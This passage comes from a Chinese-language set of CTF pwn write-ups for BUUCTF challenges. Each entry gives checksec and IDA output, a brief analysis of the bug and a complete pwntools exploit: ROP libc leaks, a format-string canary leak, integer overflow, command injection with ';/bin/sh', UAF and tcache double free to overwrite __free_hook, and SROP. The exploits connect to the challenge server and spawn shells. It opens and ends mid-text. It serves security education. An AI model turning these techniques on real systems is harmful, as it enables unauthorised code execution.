+ hex(base)) log.success(&#x27;system addr: &#x27; + hex(system)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh))#------------------attack------------------ edit(0,p32(system) + &quot;\\n&quot;) edit(1,payload + p32(binsh) + &quot;\\n&quot;) delete(3) sh.interactive() bjdctf_2020_babyrop 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA vuln 1234567ssize_t vuln()&#123; char buf; // [rsp+0h] [rbp-20h] puts(&quot;Pull up your sword and tell me u story!&quot;); return read(0, &amp;buf, 0x64uLL);&#125; 溢出+libc leak 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29594)elf = ELF(&quot;./bjdctf_2020_babyrop&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)puts_plt = elf.plt[&quot;puts&quot;]read_got = elf.got[&quot;read&quot;]main_addr = elf.sym[&quot;main&quot;]pop_rdi_ret = 0x0000000000400733payload = &quot;a&quot;*(0x20+8)payload += p64(pop_rdi_ret)+p64(read_got)payload += p64(puts_plt)+p64(main_addr)p.recvuntil(&quot;story!\\n&quot;)p.sendline(payload)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))#leak_addr = u64(p.recv(0x6))libc_base = leak_addr-libc.sym[&quot;read&quot;]sys_addr = libc_base+libc.sym[&quot;system&quot;]binsh = libc_base+libc.search(&quot;/bin/sh&quot;).next()&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr-libc.dump(&quot;read&quot;)sys_addr = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)&#x27;&#x27;&#x27;log.info(&quot;libc base=&gt;%x&quot;,libc_base)log.info(&quot;system addr=&gt;%x&quot;,sys_addr)log.info(&quot;/bin/sh=&gt;%x&quot;,binsh)payload = &#x27;a&#x27;*(0x20+8)payload += p64(pop_rdi_ret)+p64(binsh)payload += p64(sys_addr)p.sendlineafter(&quot;story!&quot;,payload)p.interactive() bjdctf_2020_babyrop2 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA gift 12345678910111213unsigned __int64 gift()&#123; char format; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;I&#x27;ll give u some gift to help u!&quot;); __isoc99_scanf(&quot;%6s&quot;, &amp;format); printf(&amp;format, &amp;format); puts(byte_400A05); fflush(0LL); return __readfsqword(0x28u) ^ v2;&#125; vuln 12345678910unsigned __int64 vuln()&#123; char buf; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;Pull up your sword and tell me u story!&quot;); read(0, &amp;buf, 0x64uLL); return __readfsqword(0x28u) ^ v2;&#125; 从gift利用字符串格式化漏洞泄露canary，再利用vuln执行漏洞 3.EXP 12345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf= ELF(&quot;./bjdctf_2020_babyrop2&quot;)#p = process(&quot;./bjdctf_2020_babyrop2&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;27381&quot;)p.sendlineafter(&quot;to help u!\\n&quot;,&quot;%7$p&quot;)p.recvuntil(&quot;0x&quot;)canary=int(p.recv(16),16)success(&quot;Canary=&gt;0x%x&quot;,canary)pop_rdi_ret = 0x0400993payload = &#x27;a&#x27;*0x18+p64(canary)+&#x27;a&#x27;*8payload += p64(pop_rdi_ret)+p64(elf.got[&quot;puts&quot;])payload += p64(elf.plt[&quot;puts&quot;])+p64(elf.sym[&quot;vuln&quot;])p.sendlineafter(&quot;tell me u story!&quot;,payload)leak = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))libc = LibcSearcher(&quot;puts&quot;,leak)base = leak-libc.dump(&quot;puts&quot;)sys_addr = base + libc.dump(&quot;system&quot;)binsh = base+ libc.dump(&quot;str_bin_sh&quot;)payload=&#x27;a&#x27;*0x18+p64(canary)+p64(0)payload+=p64(pop_rdi_ret)+p64(binsh)payload+=p64(sys_addr)p.sendlineafter(&quot;!&quot;,payload)p.interactive() bjdctf_2020_babystack 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-10h] size_t nbytes; // [rsp+Ch] [rbp-4h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); LODWORD(nbytes) = 0; puts(&quot;**********************************&quot;); puts(&quot;* Welcome to the BJDCTF! *&quot;); puts(&quot;* And Welcome to the bin world! *&quot;); puts(&quot;* Let&#x27;s try to pwn the world! *&quot;); puts(&quot;* Please told me u answer loudly!*&quot;); puts(&quot;[+]Are u ready?&quot;); puts(&quot;[+]Please input the length of your name:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;nbytes); puts(&quot;[+]What&#x27;s u name?&quot;); read(0, &amp;buf, (unsigned int)nbytes); return 0;&#125; back_door 12345signed __int64 backdoor()&#123; system(&quot;/bin/sh&quot;); return 1LL;&#125; nbytes可以被我们控制，从而造成栈溢出 3.EXP 123456from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,25325)p.sendlineafter(&quot;:&quot;,str(0x100))p.sendlineafter(&quot;?&quot;,&#x27;a&#x27;*0x18+p64(0x04006EA))p.interactive() bjdctf_2020_babystack2 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910111213141516171819202122232425int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-10h] size_t nbytes; // [rsp+Ch] [rbp-4h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); LODWORD(nbytes) = 0; puts(&quot;**********************************&quot;); puts(&quot;* Welcome to the BJDCTF! *&quot;); puts(&quot;* And Welcome to the bin world! *&quot;); puts(&quot;* Let&#x27;s try to pwn the world! *&quot;); puts(&quot;* Please told me u answer loudly!*&quot;); puts(&quot;[+]Are u ready?&quot;); puts(&quot;[+]Please input the length of your name:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;nbytes); if ( (signed int)nbytes &gt; 10 ) &#123; puts(&quot;Oops,u name is too long!&quot;); exit(-1); &#125; puts(&quot;[+]What&#x27;s u name?&quot;); read(0, &amp;buf, (unsigned int)nbytes); return 0;&#125; (signed int)nbytes 为正整数，所以存在整数溢出漏洞 backdoor 12345signed __int64 backdoor()&#123; system(&quot;/bin/sh&quot;); return 1LL;&#125; 3.EXP 123456789101112from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./bjdctf_2020_babystack2&quot;)#p = process(&quot;./bjdctf_2020_babystack2&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;28949&quot;)back_door = 0x0400726payload = &#x27;a&#x27;*0x18+p64(back_door)p.sendlineafter(&quot;:\\n&quot;,&#x27;-1&#x27;)p.sendlineafter(&quot;?\\n&quot;,payload)p.interactive() bjdctf_2020_router 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.运行 1234567Welcome to BJDCTF router test program!1.ping2.test3.leave comments4.root5.exitPlease input u choose: 根本不用EXP，考察的是linux的 命令是利用;分割的 3.EXP 1234567891011from pwn import *p = process(&#x27;./bjdctf_2020_router&#x27;)elf = ELF(&#x27;./bjdctf_2020_router&#x27;)context.log_level = &#x27;debug&#x27;p.recv()p.sendline(&quot;1&quot;)p.recv()#p.sendline(&#x27;;cat flag&#x27;)p.sendline(&#x27;;/bin/sh&#x27;)p.interactive() bjdctf_2020_YDSneedGrirlfriend 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 基本功能 123456789101112def add(sz,text): sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;) sh.sendlineafter(&quot;Her name size is :&quot;,str(sz)) sh.sendlineafter(&quot;Her name is :&quot;,text)def delete(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx))def show(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx)) del_girlfriend 123456789if ( v1 &gt;= 0 &amp;&amp; v1 &lt; count ) &#123; if ( girlfriendlist[v1] ) // UAF &#123; free(*((void **)girlfriendlist[v1] + 1)); // free(chunk) free(girlfriendlist[v1]); // free(size) puts(&quot;Success&quot;); &#125; &#125; 释放后指针没有置0，造成 use after free print_girlfriend_name 1234int __fastcall print_girlfriend_name(__int64 a1)&#123; return puts(*(const char **)(a1 + 8));&#125; 位于所申请的chunk中，可以通过之前的uaf漏洞将其改写 back_door 12345int backdoor()&#123; puts(&quot;YDS get N+ girlfriend!&quot;); return system(&quot;/bin/sh&quot;);&#125; 直接覆盖print_girlfriend_name 为 back_door 就行了 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *elf = ELF(&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)sh = 0def add(sz,text): sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;) sh.sendlineafter(&quot;Her name size is :&quot;,str(sz)) sh.sendlineafter(&quot;Her name is :&quot;,text)def delete(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx))def show(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx))def main(ip,port,mode,debug): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;bjdctf_2020_YDSneedGrirlfriend&quot;) else: sh = remote(ip,port) add(0x60,&#x27;aaaa&#x27;)#0 add(0x60,&#x27;bbbb&#x27;)#1 delete(0) delete(1) add(0x10,p64(0x400B9C)) show(0) sh.interactive()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;27659&quot;,1,1) ciscn_2019_c_1 环境：Ubuntu18 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; FILE *v3; // rdi setvbuf(_bss_start, 0LL, 2, 0LL); v3 = stdin; setvbuf(stdin, 0LL, 2, 0LL); func(v3, 0LL); return 0;&#125; func 123456789101112131415int func()&#123; int result; // eax char v1; // [rsp+0h] [rbp-30h] float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(&quot;Let&#x27;s guess the number.&quot;); gets(&amp;v1); if ( v2 == 11.28125 ) result = system(&quot;cat /flag&quot;); else result = puts(&quot;Its value should be 11.28125&quot;); return result;&#125; string 123456789101112131415LOAD:0000000000400238 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:0000000000400399 0000000A C libc.so.6LOAD:00000000004003A3 00000005 C getsLOAD:00000000004003A8 00000005 C putsLOAD:00000000004003AD 00000006 C stdinLOAD:00000000004003B3 00000007 C stdoutLOAD:00000000004003BA 00000007 C systemLOAD:00000000004003C1 00000008 C setvbufLOAD:00000000004003C9 00000012 C __libc_start_mainLOAD:00000000004003DB 0000000F C __gmon_start__LOAD:00000000004003EA 0000000C C GLIBC_2.2.5.rodata:00000000004007B4 00000018 C Let&#x27;s guess the number..rodata:00000000004007CC 0000000A C cat /flag.rodata:00000000004007D6 0000001D C Its value should be 11.28125.eh_frame:000000000040089F 00000006 C ;*3$\\&quot; v1的栈空间覆盖到v2 3.EXP 1234567from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,26782)number_addr = 0x41348000payload = &#x27;\\x00&#x27;*(0x30-4) + p64(number_addr)p.sendlineafter(&quot;Let&#x27;s guess the number.\\n&quot;,payload)print p.recv() number是地址下面保存的16进制值 ciscn_2019_en_2 和ciscn_2019_c_1一样 ciscn_2019_en_3 1.checksec 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled 2.IDA main 12345puts(&quot;Welcome to the story kingdom.&quot;); puts(&quot;What&#x27;s your name?&quot;); read(0, &amp;buf, 0x20uLL); _printf_chk(1LL, (__int64)&amp;buf); puts(&quot;Please input your ID.&quot;); 字符串格式化漏洞，可以从这里泄露libc base 只有两个有效功能 12345678def add(sz,text): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;: &quot;,str(sz)) p.sendlineafter(&quot;: &quot;,text)def delete(idx): p.sendlineafter(&quot;: &quot;,&quot;4&quot;) p.sendlineafter(&quot;: &quot;,str(idx)) main 1234567puts(&quot;Welcome to the story kingdom.&quot;);puts(&quot;What&#x27;s your name?&quot;);read(0, &amp;buf, 0x20uLL);_printf_chk(1LL, &amp;buf);puts(&quot;Please input your ID.&quot;);read(0, &amp;s, 8uLL);puts(&amp;s); 字符串格式化漏洞，printf_chk函数，导致你在使用%a$p时需要同时使用%(1到a)$p才可以，并且禁用了%n，所以利用格式化字符串写的这条路基本被pass掉，只有可能进行一些简单的leak delete 123456789101112unsigned __int64 delete()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;Please input the index:&quot;); _isoc99_scanf(&quot;%d&quot;, &amp;v1); free(qword_202068[2 * v1]); puts(&quot;Done!&quot;); return __readfsqword(0x28u) ^ v2;&#125; 指针未清0 3.GDB 12345678910#code:p.sendlineafter(&#x27;name?&#x27;,&#x27;aaaaaa&#x27;) gdb.attach(p) p.sendlineafter(&#x27;ID.&#x27;,&#x27;2&#x27;*8) leak = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) log.success(&#x27;leak addr =&gt; 0x%x&#x27;,leak)#gdb0x7fffa19cf4b0 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)0x7fffa19cf4b8 —▸ 0x7fc2db859237 (setbuffer+231) ◂— test dword ptr [rbx], 0x80000x7fffa19cf4c0 ◂— 0xa616161616161 /* &#x27;aaaaaa\\n&#x27; */ 这个时候0x7fffa19cf4b0被填充完全，接着输出就会输出0x7fffa19cf4b8的内容，0x7fffa19cf4b8的内容就是0x7fc2db859237 (setbuffer+231)，所以得出这时的libc_now=0x7fc2db859237 - 231，那么libc base = libc_now - libc.sym[&quot;setbuffer&quot;] 接着就是填入/bin/sh，改_free_hook为system 4.EXP 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./ciscn_2019_en_3&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.27.so&quot;)#p = process(&quot;./ciscn_2019_en_3&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;27106&quot;)def add(sz,text): p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;) p.sendlineafter(&quot;: \\n&quot;,str(sz)) p.sendlineafter(&quot;: \\n&quot;,text)def delete(idx): p.sendlineafter(&quot;choice:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:\\n&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: p.sendlineafter(&#x27;name?&#x27;,&#x27;aaaaaa&#x27;) p.sendlineafter(&#x27;ID.&#x27;,&#x27;2&#x27;*8) libcbase=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))-231-libc.sym[&#x27;setbuffer&#x27;] free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;] system=libcbase+libc.sym[&#x27;system&#x27;] log.success(&#x27;libc base =&gt; 0x%x&#x27;,libcbase) log.success(&#x27;free hook =&gt; %x&#x27;,free_hook) log.success(&#x27;sys addr =&gt; 0x%x&#x27;,system) add(0x20,&#x27;aaaa&#x27;)#0 add(0x20,&#x27;/bin/sh\\x00&#x27;) delete(0) delete(0) #double free add(0x20,p64(free_hook)) add(0x20,&#x27;dd&#x27;) add(0x20,p64(system)) delete(1) p.interactive() ciscn_2019_es_1 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA 12345678910111213def add(sz,name,call): p.sendlineafter(&quot;choice:&quot;,&#x27;1&#x27;) p.sendlineafter(&quot;Please input the size of compary&#x27;s name\\n&quot;,str(sz)) p.sendlineafter(&quot;please input name:&quot;,name) p.sendlineafter(&quot;please input compary call:&quot;,call)def show(idx): p.sendlineafter(&quot;choice:&quot;,&#x27;2&#x27;) p.sendlineafter(&quot;index:\\n&quot;,str(idx))def free(idx): p.sendlineafter(&quot;choice:&quot;,&#x27;3&#x27;) p.sendlineafter(&quot;index:\\n&quot;,str(idx)) add 12puts(&quot;please input name:&quot;); read(0, (void *)*heap_addr_4080[heap_number], (unsigned int)size); 这个可以直接让我们写到chunk-&gt;fd的位置 call 123456 if ( heap_addr_4080[v1] ) free((void *)*heap_addr_4080[v1]); puts(&quot;You try it!&quot;); puts(&quot;Done&quot;); return __readfsqword(0x28u) ^ v2;&#125; 这里没有释放后没有清零，use after free 思路 1.利用show函数泄露libc 2.程序里面有个uaf，利用这个进行double_free来修改tcache里面的fd指针，从而将free_hook改为_libc_system 3.free掉我们提前埋下的**/bin/sh**的chunk，从而getshell 3.gdb 利用show函数泄露libc 123456add(0x410,&#x27;aaaa&#x27;,&#x27;123&#x27;)add(0x20,&quot;bbbb&quot;,&#x27;124&#x27;)add(0x20,&quot;/bin/sh\\x00&quot;,&#x27;125&#x27;)free(0)show(0) 2.程序里面有个uaf，利用这个进行double_free来修改tcache里面的fd指针，从而将free_hook改为_libc_system double free 12free(1)free(1) ​ gdb 1234567891011121314151617pwndbg&gt; bintcachebins0x30 [ 2]: 0x55ce4a46d6c0 ◂— 0x55ce4a46d6c0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x55ce4a46d270 —▸ 0x7ff520e96ca0 (main_arena+96) ◂— 0x55ce4a46d270smallbinsemptylargebinsempty 修改free_hook 123add(0x28,p64(free_hook),&#x27;126&#x27;)add(0x28,&#x27;111&#x27;,&#x27;127&#x27;)add(0x28,p64(system),&#x27;128&#x27;) 4.EXP 这里是改free为system，所以就必须先libc leak， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *elf = ELF(&quot;ciscn_s_6&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)sh = 0def add(sz,name,call): sh.sendlineafter(&quot;choice:&quot;,&#x27;1&#x27;) sh.sendlineafter(&quot;Please input the size of compary&#x27;s name\\n&quot;,str(sz)) sh.sendlineafter(&quot;please input name:&quot;,name) sh.sendlineafter(&quot;please input compary call:&quot;,call)def show(idx): sh.sendlineafter(&quot;choice:&quot;,&#x27;2&#x27;) sh.sendlineafter(&quot;index:\\n&quot;,str(idx))def free(idx): sh.sendlineafter(&quot;choice:&quot;,&#x27;3&#x27;) sh.sendlineafter(&quot;index:\\n&quot;,str(idx))def main(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;ciscn_s_6&quot;) else: sh = remote(ip,port) add(0x410,&#x27;aaaa&#x27;,&#x27;123&#x27;) add(0x20,&quot;bbbb&quot;,&#x27;124&#x27;) add(0x20,&quot;/bin/sh\\x00&quot;,&#x27;125&#x27;) free(0) show(0) #0x7fffff3ebca0 (main_arena+96) leak_addr = u64(sh.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) libc_base = leak_addr-96-0x10-libc.sym[&quot;__malloc_hook&quot;] free_hook=libc_base+libc.sym[&quot;__free_hook&quot;] system = libc_base+libc.sym[&quot;system&quot;] log.info(&quot;libc base=&gt;%x&quot;,libc_base) log.info(&quot;free_hook=&gt;%x&quot;,free_hook) log.info(&quot;system real=&gt;%x&quot;,system) #double free free(1) free(1) add(0x28,p64(free_hook),&#x27;126&#x27;) add(0x28,&#x27;111&#x27;,&#x27;127&#x27;) add(0x28,p64(system),&#x27;128&#x27;) #GDB() free(2) sh.interactive()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;28066&quot;,0,0) 为什么是0x3c4b78？ 动态调试出来，泄露的unsorted bin地址减去vmmap下查看的libc基址 add(0x410,‘aaaa’,‘123’)，为什么是0x410？ 因为add对申请的堆的大小没有限制，而申请一个大的堆块(&gt;0x400)，这个堆块被free后就会直接被分配进入unsorted bin ciscn_2019_es_2 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(); puts(&quot;Welcome, my friend. What&#x27;s your name?&quot;); vul(); return 0;&#125; vul 12345678910int vul()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(&quot;Hello, %s\\n&quot;, &amp;s); read(0, &amp;s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, &amp;s);&#125; hack 1234int hack()&#123; return system(&quot;echo flag&quot;);&#125; 因为有system，可以不用libc_leak,但是要泄露EBP 12345678910111213141516171819====system(&quot;/bin/sh\\x00&quot;)====must size()=0x28=40====then can overflow| a*4 || a*4 || Addr_1 || b*4 || sys_plt || sys_ret || Addr_2 || /bin || /sh\\x00 || 对齐 |=====ret_addr:| Addr_3 |==========0x28+4=44=0x2c= Addr_3Addr_1=44-4-4=36=0x24Addr_2=44-4*5=24=0x1c(sys_ret不在ebp上偏移传参) 3.EXP 123456789101112131415161718from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29643)elf = ELF(&quot;./ciscn_2019_es_2&quot;)sys_addr = 0x8048400 #-------EBP_LEAK-------------pl = &#x27;a&#x27;*0x20+&quot;b&quot;*8p.send(pl)p.recvuntil(&#x27;b&#x27;*8)ebp = u32(p.recv(4))print(hex(ebp))pl2=(&#x27;a&#x27;*8+p32(ebp-0x24)+&#x27;bbbb&#x27;+p32(sys_addr)+&#x27;cccc&#x27;+p32(ebp-0x1c)+&#x27;/bin/sh\\x00&#x27;).ljust(0x28,&#x27;p&#x27;)+p32(ebp-0x2c) #p32(sys_addr)+&#x27;aaaa&#x27;+p32(sh_addr)p.send(pl2)p.interactive() ciscn_2019_es_7 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA vuln 123456789101112131415161718192021222324252627; read(fd,buf,0x400); write(fd,buf,0x30); Attributes: bp-based frame public vulnvuln proc near ; CODE XREF: main+14↓pbuf = byte ptr -10h; __unwind &#123; push rbp mov rbp, rsp xor rax, rax mov edx, 400h ; count lea rsi, [rsp+buf] ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read mov rax, 1 mov edx, 30h ; count lea rsi, [rsp+buf] ; buf mov rdi, rax ; fd syscall ; LINUX - sys_write retnvuln endp ; sp-analysis failed; --------------------------------------------------------------------------- db 90h; --------------------------------------------------------------------------- pop rbp retn; &#125; // starts at 4004ED 分析syscall，发现只有read和write。 gadgets 12345678910111213141516gadgets proc near; __unwind &#123; push rbp mov rbp, rsp mov rax, 0Fh ; //constants.SYS_sigreturn retngadgets endp ; sp-analysis failed; --------------------------------------------------------------------------- mov rax, 3Bh ; //execve retn; --------------------------------------------------------------------------- db 90h; --------------------------------------------------------------------------- pop rbp retn; &#125; // starts at 4004D6 mov rax, 0Fh: 在syscall里面，0xf代表constants.SYS_sigreturn mov rax, 3Bh: 在syscall里面，0x3b代表execve 所以要用SROP 3.EXP 123456789101112131415161718192021222324from pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_7&quot;)context.log_level =&#x27;debug&#x27; context.arch=&#x27;amd64&#x27;sh=remote(&quot;node3.buuoj.cn&quot;,27162)syscall_ret=0x400517read=0x4004f1movrax_sigreturn=0x4004damovrax_system=0x4004E2sh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(read))sh.recv(32)stack_addr=u64(sh.recv(8))log.success(&quot;stack: &quot;+hex(stack_addr))sh.recv(8)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280 # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retsh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))sh.interactive() ciscn_2019_final_2 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA 老几样了 12345678910111213141516171819202122def add_int(add_type, add_num): p.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, &#x27;1&#x27;) p.sendafter(&#x27;your inode number:&#x27;, str(add_num))def add_short(add_num): p.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, &#x27;2&#x27;) p.sendafter(&#x27;:&#x27;, str(add_num))def remove(remove_type): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;2&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(remove_type))def show(show_type): p.sendlineafter(&#x27;&gt; &#x27;, &#x27;3&#x27;) p.sendlineafter(&#x27;short int\\n&gt;&#x27;, str(show_type)) if show_type == 1: p.recvuntil(&#x27;:&#x27;) elif show_type == 2: p.recvuntil(&#x27;:&#x27;) return int(p.recvuntil(&#x27;\\n&#x27;)) init 12345678fd = open(&quot;flag&quot;, 0);if ( fd == -1 )&#123; puts(&quot;no such file :flag&quot;); exit(-1);&#125;dup2(fd, 666);close(fd); dup2(fd, 666)的意思是，newfd指向oldfd句柄指向的文件描述符结构，即原本是指向标准输出文件描述结构体的666指向了flag，这样一来，原本输出 到显示器终端的字符串就打印到test.file文件中了，这也是Linux操作系统的重定向实现方法 fileno()用来取得参数stream指定的文件流所使用的文件描述词 返回值 ：返回和stream文件流对应的文件描述符。如果失败，返回-1 bye_bye 123456789101112void __noreturn bye_bye()&#123; char v0; // [rsp+0h] [rbp-70h] unsigned __int64 v1; // [rsp+68h] [rbp-8h] v1 = __readfsqword(0x28u); puts(&quot;what do you want to say at last? &quot;); __isoc99_scanf(&quot;%99s&quot;, &amp;v0); printf(&quot;your message :%s we have received...\\n&quot;, &amp;v0); puts(&quot;have fun !&quot;); exit(0);&#125; 结合init可知，最后基本上就靠这个函数得到flag了 delete 123456789101112if ( v1 == 1 &amp;&amp; int_pt ) &#123; free(int_pt); bool = 0; puts(&quot;remove success !&quot;); &#125; if ( v1 == 2 &amp;&amp; short_pt ) &#123; free(short_pt); bool = 0; puts(&quot;remove success !&quot;); &#125; 释放指针指向的地址后，指针未置零 add 123456789101112131415161718192021222324if ( v3 == 1 ) &#123; int_pt = malloc(0x20uLL); if ( !int_pt ) exit(-1); bool = 1; printf(&quot;your inode number:&quot;); v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt; puts(&quot;add success !&quot;); &#125; if ( v3 == 2 ) &#123; short_pt = malloc(0x10uLL); if ( !short_pt ) exit(-1); bool = 1; printf(&quot;your inode number:&quot;); v1 = get_atoi(); *(_WORD *)short_pt = v1; *((_WORD *)short_pt + 4) = *(_WORD *)short_pt; puts(&quot;add success !&quot;); &#125; 每次分配的空间都是固定的 .bss 1234567891011.bss:0000000000202050 int_pt dq ? ; DATA XREF: show+4E↑r.bss:0000000000202050 ; show+5A↑r ....bss:0000000000202058 public short_pt.bss:0000000000202058 ; void *short_pt.bss:0000000000202058 short_pt dq ? ; DATA XREF: show+7C↑r.bss:0000000000202058 ; show+88↑r ....bss:0000000000202060 public _bool.bss:0000000000202060 _bool dd ? ; DATA XREF: allocate:loc_F8C↑w.bss:0000000000202060 ; allocate:loc_1009↑w ....bss:0000000000202064 align 8.bss:0000000000202064 _bss ends int_pt和short_pt均为全局指针变量 环境是ubuntu18，应该是用tcache累加得到一个unsorted bin，最后释放后得到libc base,得到fileno；然后利用house of spirit将stdin的fileno改为666，scanf就会从flag文件读取flag GDB over_lapping+libc_leak 1234567891011121314151617181920212223242526272829303132#code: add(1,0x30) #0x10 remove(1) #加入tcache add(2,0x20) #0x20 add(2,0x20) #0x20 add(2,0x20) #0x20 add(2,0x20) #0x20 remove(2) #加入tcache add(1,0x30) #0x10 remove(2) #加入tcache addr_chunk0_prev_size = show(2) - 0xa0 add(2, addr_chunk0_prev_size) add(2, addr_chunk0_prev_size) add(2, 0x91) gdb.attach(p)#gdb0x563281ce9250 PREV_INUSE &#123; mchunk_prev_size = 145, mchunk_size = 145, fd = 0x30, bk = 0x30, fd_nextsize = 